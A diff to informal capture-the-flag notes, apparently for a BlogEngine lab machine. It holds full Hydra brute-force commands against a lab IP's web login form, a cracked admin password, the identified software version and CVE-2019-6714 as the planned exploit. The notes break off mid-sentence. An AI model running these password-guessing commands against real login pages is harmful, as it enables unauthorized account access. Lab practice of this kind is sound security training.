@@ -39,7 +39,7 @@ hydra -l <user> -P <password.txt> <ip-target> http-post-form "header_file_name:r
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 
 ```
-### Complete Hydra Command 
+## Complete Hydra Command 
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form "/Account/login.aspx:__VIEWSTATE=GlE2yCmLJhjxMS3WAapWzHpHopOnSZe%2Bql42iFWRXoiZ5H%2B8ev8wIrptaXJve3Sbd6pT%2FrwUgyiQoljyTpvaSFmerFfikAhX%2B0x7wPKeGvX%2Bln5s3lF2MiRyzfhkETMzMVqmG9YOF%2BAbgUUrv5BaI3M%2BnQEoVdHs68l%2BWv%2Fl1Kju7ufm&__EVENTVALIDATION=fHY6mqK6KeT8pJYrkCm%2FDIV5hhJF6aZ7UbhYd3Y4cdb0CgsyhEzYd6Pa1y8%2F463qYWZXFr0uMjTAP81waQE2U5kWlkKKjrEi8KYqWJBk0C%2F0Wmoo%2B0GtbYNAYGwQh%2F5bdiyauLB7eVBmo%2F%2BGKpFUGFB5GFJyiAvLS78nzJwIsoRgpDZY&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
 ```
@@ -51,4 +51,17 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.205.233 http-post-form 
 login: admin   password: 1qaz2wsx
 ```
 
-# Acces
+# Access to the Website Admin
+![[Pasted image 20251018161322.png]]
+
+The version of BlogEngine after looking around is:  3.3.6.0 
+
+Lets find an exploit for this, simply search on google and look for the most common website like rapid7 or exploitdb
+
+The CVE is: ***CVE-2019-6714***
+
+# Using the public exploit, gain initial access to the server.
+
+Who is the webserver running as?
+
+How TF are we gonna do this? lol i think we will need to use the exploit that we just found and try to 
